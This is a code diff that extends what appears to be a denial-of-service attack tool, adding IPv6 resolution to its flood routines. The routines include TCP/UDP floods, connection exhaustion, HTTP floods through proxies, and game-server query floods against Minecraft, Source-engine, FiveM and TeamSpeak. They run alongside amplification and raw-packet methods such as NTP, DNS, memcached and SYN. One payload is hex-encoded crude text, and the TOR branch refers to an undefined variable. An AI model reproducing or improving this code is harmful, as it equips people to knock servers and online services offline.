@@ -11,9 +11,9 @@ from os import urandom as randbytes
 from pathlib import Path
 from re import compile
 from random import choice as randchoice, randint
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
-                    gethostname, socket)
+from ipaddress import ip_address
+from socket import (AF_INET, AF_INET6, AF_UNSPEC, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
+                    IPPROTO_ICMP, SOCK_RAW, SOCK_STREAM, TCP_NODELAY, getaddrinfo, gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 import ssl
 from struct import pack as data_pack
@@ -288,6 +288,21 @@ class Tools:
         return True
 
     @staticmethod
+    def resolve_target(host: str, port: int, socktype=SOCK_STREAM):
+        try:
+            ip = ip_address(host)
+        except ValueError:
+            addrinfos = getaddrinfo(host, port, AF_UNSPEC, socktype)
+            if not addrinfos:
+                raise OSError(f"Cannot resolve hostname {host}")
+            family, _, _, _, sockaddr = addrinfos[0]
+            return family, sockaddr, sockaddr[0]
+
+        if ip.version == 6:
+            return AF_INET6, (host, port, 0, 0), host
+        return AF_INET, (host, port), host
+
+    @staticmethod
     def dgb_solver(url, ua, pro=None):
         s = None
         idss = None
@@ -439,6 +454,8 @@ class Minecraft:
 class Layer4(Thread):
     _method: str
     _target: Tuple[str, int]
+    _addr_family: int
+    _sockaddr: tuple
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
@@ -446,6 +463,8 @@ class Layer4(Thread):
 
     def __init__(self,
                  target: Tuple[str, int],
+                 addr_family: int,
+                 sockaddr: tuple,
                  ref: List[str] = None,
                  method: str = "TCP",
                  synevent: Event = None,
@@ -458,6 +477,8 @@ class Layer4(Thread):
         self.protocolid = protocolid
         self._method = method
         self._target = target
+        self._addr_family = addr_family
+        self._sockaddr = sockaddr
         self._synevent = synevent
         if proxies:
             self._proxies = list(proxies)
@@ -494,12 +515,12 @@ class Layer4(Thread):
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.settimeout(.9)
-        s.connect(self._target)
+        s.connect(self._sockaddr)
         return s
 
     def TCP(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(self._addr_family, SOCK_STREAM) as s:
             while Tools.send(s, randbytes(1024)):
                 continue
         Tools.safe_close(s)
@@ -509,7 +530,7 @@ class Layer4(Thread):
         ping = Minecraft.data(b'\x00')
 
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(self._addr_family, SOCK_STREAM) as s:
             while Tools.send(s, handshake):
                 Tools.send(s, ping)
         Tools.safe_close(s)
@@ -517,13 +538,13 @@ class Layer4(Thread):
     def CPS(self) -> None:
         global REQUESTS_SENT
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(self._addr_family, SOCK_STREAM) as s:
             REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(self._addr_family, SOCK_STREAM) as s:
             while s.recv(1):
                 continue
         Tools.safe_close(s)
@@ -536,8 +557,8 @@ class Layer4(Thread):
 
     def UDP(self) -> None:
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+        with suppress(Exception), socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, randbytes(1024), self._sockaddr):
                 continue
         Tools.safe_close(s)
 
@@ -577,7 +598,7 @@ class Layer4(Thread):
     def MCBOT(self) -> None:
         s = None
 
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(self._addr_family, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
                                                         2,
@@ -601,8 +622,8 @@ class Layer4(Thread):
         global BYTES_SEND, REQUESTS_SENT
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+        with socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._sockaddr):
                 continue
         Tools.safe_close(s)
 
@@ -619,24 +640,24 @@ class Layer4(Thread):
         payload_str = f"token={token}&guid={guid}"
         payload = payload_str.encode('utf-8')
 
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+        with socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._sockaddr):
                 continue
         Tools.safe_close(s)
 
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+        with socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._sockaddr):
                 continue
         Tools.safe_close(s)
 
     def TS3(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+        with socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._sockaddr):
                 continue
         Tools.safe_close(s)
 
@@ -646,8 +667,8 @@ class Layer4(Thread):
                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                    b'\x73')
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+        with socket(self._addr_family, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._sockaddr):
                 continue
         Tools.safe_close(s)
 
@@ -789,7 +810,8 @@ class HttpFlood(Thread):
     def __init__(self,
                  thread_id: int,
                  target: URL,
-                 host: str,
+                 addr_family: int,
+                 raw_target: tuple,
                  method: str = "GET",
                  rpc: int = 1,
                  synevent: Event = None,
@@ -803,11 +825,8 @@ class HttpFlood(Thread):
         self._rpc = rpc
         self._method = method
         self._target = target
-        self._host = host
-        self._raw_target = (self._host, (self._target.port or 80))
-
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._host, (self._target.port or 80))
+        self._addr_family = addr_family
+        self._raw_target = raw_target
 
         self.methods = {
             "POST": self.POST,
@@ -934,9 +953,9 @@ class HttpFlood(Thread):
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+            sock = randchoice(self._proxies).open_socket(self._addr_family, SOCK_STREAM)
         else:
-            sock = socket(AF_INET, SOCK_STREAM)
+            sock = socket(self._addr_family, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.settimeout(.9)
@@ -944,7 +963,7 @@ class HttpFlood(Thread):
 
         if self._target.scheme.lower() == "https":
             sock = ctx.wrap_socket(sock,
-                                   server_hostname=host[0] if host else self._target.host,
+                                   server_hostname=self._target.host,
                                    server_side=False,
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
@@ -1709,9 +1728,13 @@ if __name__ == '__main__':
 
                 if method != "TOR":
                     try:
-                        host = gethostbyname(url.host)
+                        addr_family, raw_target, resolved_host = Tools.resolve_target(
+                            url.host, url.port or 80)
                     except Exception as e:
                         exit('Cannot resolve hostname ', url.host, str(e))
+                else:
+                    addr_family = AF_INET
+                    raw_target = (host, url.port or 80)
 
                 threads = int(argv[4])
                 rpc = int(argv[6])
@@ -1757,22 +1780,30 @@ if __name__ == '__main__':
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
+                    HttpFlood(thread_id, url, addr_family, raw_target, method, rpc, event,
                               uagents, referers, proxies).start()
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
 
                 port = target.port
+                if not port:
+                    logger.warning("Port Not Selected, Set To Default: 80")
+                    port = 80
+                target_host = target.host
                 target = target.host
 
                 try:
-                    target = gethostbyname(target)
+                    addr_family, raw_target, target = Tools.resolve_target(target_host, port or 0)
                 except Exception as e:
-                    exit('Cannot resolve hostname ', url.host, e)
+                    exit('Cannot resolve hostname ', target_host, e)
 
                 if port > 65535 or port < 1:
                     exit("Invalid Port [Min: 1 / Max: 65535] ")
+
+                if addr_family == AF_INET6 and method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD",
+                                                          "SYN", "ICMP", "OVH-UDP"}:
+                    exit("IPv6 target is not supported for raw packet methods")
 
                 if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                         not ToolsConsole.checkRawSocket():
@@ -1786,10 +1817,6 @@ if __name__ == '__main__':
                 timer = int(argv[4])
                 proxies = None
                 ref = None
-
-                if not port:
-                    logger.warning("Port Not Selected, Set To Default: 80")
-                    port = 80
 
                 if method in {"SYN", "ICMP"}:
                     __ip__ = __ip__
@@ -1822,7 +1849,8 @@ if __name__ == '__main__':
                 protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                 
                 if method == "MCBOT":
-                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
+                    with suppress(Exception), socket(addr_family, SOCK_STREAM) as s:
+                        s.connect(raw_target)
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                         Tools.send(s, Minecraft.data(b'\x00'))
 
@@ -1833,7 +1861,7 @@ if __name__ == '__main__':
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
                 for _ in range(threads):
-                    Layer4((target, port), ref, method, event,
+                    Layer4((target, port), addr_family, raw_target, ref, method, event,
                            proxies, protocolid).start()
 
             logger.info(
